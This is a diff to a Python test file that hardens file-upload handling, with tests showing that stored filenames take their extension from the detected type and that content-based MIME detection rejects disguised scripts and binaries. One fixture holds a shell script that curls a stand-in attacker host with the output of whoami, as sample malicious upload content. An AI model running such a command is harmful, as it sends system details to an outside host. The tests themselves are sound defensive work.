@@ -7,7 +7,11 @@ from pathlib import Path
 
 import pytest
 
-from snackbase.domain.services.file_storage_service import FileMetadata, FileStorageService
+from snackbase.domain.services.file_storage_service import (
+    FileMetadata,
+    FileStorageService,
+    detect_mime_type,
+)
 
 
 class TestFileMetadata:
@@ -95,20 +99,24 @@ class TestFileStorageService:
         """Create a FileStorageService with temporary storage."""
         return FileStorageService(storage_path=temp_storage_path)
 
-    def test_generate_unique_filename(self, storage_service):
-        """Test generating unique filename preserves extension."""
-        result = storage_service._generate_unique_filename("test.txt")
+    def test_generate_unique_filename_uses_the_detected_type(self, storage_service):
+        """The stored name is a UUID plus the extension of the detected type.
+
+        The request-supplied filename is not consulted at all (M-02): letting it
+        choose the extension on disk is what made the MIME allowlist advisory.
+        """
+        result = storage_service._generate_unique_filename("text/plain")
 
         assert result.endswith(".txt")
-        assert result != "test.txt"
         assert len(result) > 10  # UUID should make it longer
 
-    def test_generate_unique_filename_no_extension(self, storage_service):
-        """Test generating unique filename without extension."""
-        result = storage_service._generate_unique_filename("test")
+    def test_generate_unique_filename_falls_back_for_unmappable_type(
+        self, storage_service
+    ):
+        """An allowed type the platform cannot map to an extension gets `.bin`."""
+        result = storage_service._generate_unique_filename("application/x-unmappable")
 
-        assert result != "test"
-        assert "." not in result or result.count(".") == 0
+        assert result.endswith(".bin")
 
     def test_validate_file_size_success(self, storage_service):
         """Test file size validation passes for valid size."""
@@ -308,3 +316,53 @@ class TestFileStorageService:
         """Test that delete_file rejects files from different account."""
         with pytest.raises(ValueError, match="Invalid file path"):
             storage_service.delete_file("account1", "account2/file.txt")
+
+
+class TestDetectMimeType:
+    """Tests for content-based MIME detection (M-02).
+
+    The client writes `Content-Type` into the multipart part header, so an
+    allowlist checked against it is advisory. These cover what the bytes are
+    allowed to say about themselves.
+    """
+
+    # A real 1x1 PNG.
+    PNG_BYTES = bytes.fromhex(
+        "89504e470d0a1a0a"
+        "0000000d49484452000000010000000108060000001f15c489"
+        "0000000a49444154789c63000100000500010d0a2db4"
+        "0000000049454e44ae426082"
+    )
+    PDF_BYTES = b"%PDF-1.4\n1 0 obj\n<< >>\nendobj\ntrailer\n<< >>\n%%EOF\n"
+    SHELL_SCRIPT_BYTES = b"#!/bin/sh\ncurl https://attacker.example.com/$(whoami)\n"
+    ELF_BYTES = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
+
+    def test_signature_wins_over_the_declared_type(self):
+        """A real PNG is a PNG whatever the part header claims."""
+        assert detect_mime_type(self.PNG_BYTES, "text/plain") == "image/png"
+
+    def test_genuine_pdf_is_detected(self):
+        assert detect_mime_type(self.PDF_BYTES, "application/pdf") == "application/pdf"
+
+    def test_signatureless_text_may_claim_a_text_type(self):
+        assert detect_mime_type(b"just some text\n", "text/plain") == "text/plain"
+
+    def test_script_claiming_an_image_is_refused(self):
+        """A shell script has no signature, and `image/png` requires one."""
+        with pytest.raises(ValueError, match="does not match the declared type"):
+            detect_mime_type(self.SHELL_SCRIPT_BYTES, "image/png")
+
+    def test_executable_claiming_an_image_is_refused(self):
+        """An ELF binary is a recognisable format, and not an allowed one."""
+        with pytest.raises(ValueError, match="not an allowed file type"):
+            detect_mime_type(self.ELF_BYTES, "image/png")
+
+    def test_binary_content_cannot_claim_a_text_type(self):
+        """`text/plain` needs no signature, but it does need to be text."""
+        with pytest.raises(ValueError, match="does not match the declared type"):
+            detect_mime_type(b"\x00\x01\x02\xff\xfe", "text/plain")
+
+    def test_disallowed_declared_type_reports_as_disallowed(self):
+        """An honestly-declared bad type keeps its own error, not a mismatch."""
+        with pytest.raises(ValueError, match="is not allowed"):
+            detect_mime_type(self.SHELL_SCRIPT_BYTES, "application/x-sh")
